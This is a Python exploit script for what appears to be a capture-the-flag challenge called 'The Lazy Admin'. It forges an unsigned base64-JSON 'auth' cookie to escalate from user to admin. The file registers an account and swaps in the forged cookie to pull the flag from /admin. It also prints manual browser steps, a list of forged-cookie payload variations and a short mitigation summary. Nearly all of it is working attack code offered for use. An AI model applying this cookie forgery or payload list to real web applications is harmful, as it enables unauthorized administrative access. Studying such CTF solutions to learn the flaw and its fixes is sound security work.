#!/usr/bin/env python3
"""
The Lazy Admin Cookie Manipulation Payload
Demonstrates privilege escalation from user to admin via cookie manipulation

This payload shows how to:
1. Register as a normal user
2. Extract and decode the authentication cookie
3. Modify the role from "user" to "admin"
4. Re-encode and use the modified cookie to gain admin access
"""

import requests
import base64
import json
from urllib.parse import quote, unquote

def create_admin_cookie_payload():
    """
    Creates the malicious cookie payload to escalate from user to admin
    
    Cookie Structure Analysis:
    - Format: URL-encoded(base64(JSON))
    - Normal user: {"username":"user","role":"user"}
    - Admin payload: {"username":"admin","role":"admin"}
    """
    
    print("="*60)
    print("LAZY ADMIN COOKIE MANIPULATION PAYLOAD")
    print("="*60)
    
    # Step 1: Show normal user cookie structure
    normal_user_data = {"username": "normaluser", "role": "user"}
    print(f"[*] Normal user cookie data: {normal_user_data}")
    
    # Step 2: Create admin payload
    admin_payload_data = {"username": "admin", "role": "admin"}
    print(f"[*] Admin payload data: {admin_payload_data}")
    
    # Step 3: Encode the admin payload
    json_str = json.dumps(admin_payload_data)
    base64_encoded = base64.b64encode(json_str.encode()).decode()
    url_encoded = quote(base64_encoded, safe='')
    
    print(f"\n[+] ADMIN COOKIE PAYLOAD:")
    print(f"    Raw JSON: {json_str}")
    print(f"    Base64: {base64_encoded}")
    print(f"    URL-encoded: {url_encoded}")
    
    return url_encoded

def demonstrate_cookie_manipulation():
    """
    Demonstrates the complete cookie manipulation process
    """
    
    base_url = "https://the-lazy-admin.onrender.com"
    session = requests.Session()
    
    print(f"\n[*] Target: {base_url}")
    
    # Step 1: Register a normal user
    print("\n[STEP 1] Registering normal user...")
    username = "testuser123"
    password = "testpass123"
    
    register_response = session.post(f"{base_url}/register", 
                                   json={"username": username, "password": password})
    
    if register_response.status_code == 200:
        print(f"[+] User '{username}' registered successfully")
    else:
        print(f"[-] Registration failed: {register_response.text}")
        return
    
    # Step 2: Login to get normal user cookie
    print(f"\n[STEP 2] Logging in as normal user...")
    login_response = session.post(f"{base_url}/login",
                                json={"username": username, "password": password})
    
    if login_response.status_code == 200:
        print(f"[+] Login successful")
        
        # Extract the original cookie
        original_cookie = session.cookies.get('auth')
        print(f"[*] Original cookie: {original_cookie}")
        
        # Decode and show the structure
        try:
            url_decoded = unquote(original_cookie)
            base64_decoded = base64.b64decode(url_decoded)
            cookie_data = json.loads(base64_decoded.decode('utf-8'))
            print(f"[*] Decoded cookie data: {cookie_data}")
            print(f"[*] Current role: {cookie_data.get('role', 'unknown')}")
        except Exception as e:
            print(f"[-] Cookie decode error: {e}")
            return
    else:
        print(f"[-] Login failed: {login_response.text}")
        return
    
    # Step 3: Create malicious admin cookie
    print(f"\n[STEP 3] Creating malicious admin cookie...")
    admin_cookie = create_admin_cookie_payload()
    
    # Step 4: Replace the cookie with admin payload
    print(f"\n[STEP 4] Applying admin cookie payload...")
    session.cookies['auth'] = admin_cookie
    print(f"[+] Cookie replaced with admin payload")
    
    # Step 5: Test admin access
    print(f"\n[STEP 5] Testing admin access...")
    admin_response = session.get(f"{base_url}/admin")
    
    if admin_response.status_code == 200:
        try:
            admin_data = admin_response.json()
            if 'flag' in admin_data:
                print(f"\n🚩 SUCCESS! FLAG OBTAINED: {admin_data['flag']}")
                print(f"[+] Admin username: {admin_data.get('username', 'unknown')}")
                print(f"[+] Message: {admin_data.get('message', 'No message')}")
            else:
                print(f"[+] Admin access granted: {admin_data}")
        except:
            print(f"[+] Admin access response: {admin_response.text}")
    else:
        print(f"[-] Admin access denied: {admin_response.text}")

def show_manual_exploitation_steps():
    """
    Shows manual steps for browser-based exploitation
    """
    
    print(f"\n" + "="*60)
    print("MANUAL BROWSER EXPLOITATION STEPS")
    print("="*60)
    
    print("""
1. REGISTER & LOGIN:
   - Go to https://the-lazy-admin.onrender.com/register
   - Create account: username=testuser, password=testpass
   - Login with your credentials

2. INSPECT COOKIE:
   - Open browser Developer Tools (F12)
   - Go to Application/Storage tab → Cookies
   - Find 'auth' cookie, copy its value
   - Example: eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicm9sZSI6InVzZXIifQ%3D%3D

3. DECODE COOKIE:
   - URL decode: eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicm9sZSI6InVzZXIifQ==
   - Base64 decode: {"username":"testuser","role":"user"}

4. CREATE ADMIN PAYLOAD:
   - Modify JSON: {"username":"admin","role":"admin"}
   - Base64 encode: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=
   - URL encode: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0%3D

5. REPLACE COOKIE:
   - In Developer Tools, edit the 'auth' cookie
   - Replace with: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0%3D
   - Refresh the page

6. ACCESS ADMIN PANEL:
   - Navigate to /admin endpoint
   - You should now have admin access and see the flag!
""")

def show_payload_variations():
    """
    Shows different payload variations for cookie manipulation
    """
    
    print(f"\n" + "="*60)
    print("COOKIE PAYLOAD VARIATIONS")
    print("="*60)
    
    payloads = [
        {"username": "admin", "role": "admin"},
        {"username": "administrator", "role": "admin"},
        {"username": "root", "role": "admin"},
        {"username": "admin", "role": "administrator"},
        {"username": "admin", "role": "root"},
        {"user": "admin", "role": "admin"},
        {"username": "admin", "role": "admin", "isAdmin": True},
        {"username": "admin", "role": "admin", "privilege": "admin"},
    ]
    
    print("[*] Different admin cookie payloads to try:")
    
    for i, payload in enumerate(payloads, 1):
        json_str = json.dumps(payload)
        base64_encoded = base64.b64encode(json_str.encode()).decode()
        url_encoded = quote(base64_encoded, safe='')
        
        print(f"\n{i}. JSON: {json_str}")
        print(f"   Cookie: {url_encoded}")

def main():
    """
    Main function - demonstrates the complete attack
    """
    
    # Show the payload creation
    create_admin_cookie_payload()
    
    # Demonstrate live exploitation
    print(f"\n" + "="*60)
    print("LIVE EXPLOITATION DEMONSTRATION")
    print("="*60)
    
    try:
        demonstrate_cookie_manipulation()
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
    
    # Show manual steps
    show_manual_exploitation_steps()
    
    # Show payload variations
    show_payload_variations()
    
    print(f"\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    print("""
VULNERABILITY: Insecure Direct Object Reference via Cookie Manipulation
IMPACT: Privilege Escalation from User to Admin
ROOT CAUSE: Client-side role validation without server-side verification

KEY PAYLOAD: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0%3D
DECODES TO: {"username":"admin","role":"admin"}

MITIGATION:
- Implement server-side role validation
- Use signed/encrypted tokens (JWT with proper validation)
- Never trust client-side data for authorization decisions
""")

if __name__ == "__main__":
    main()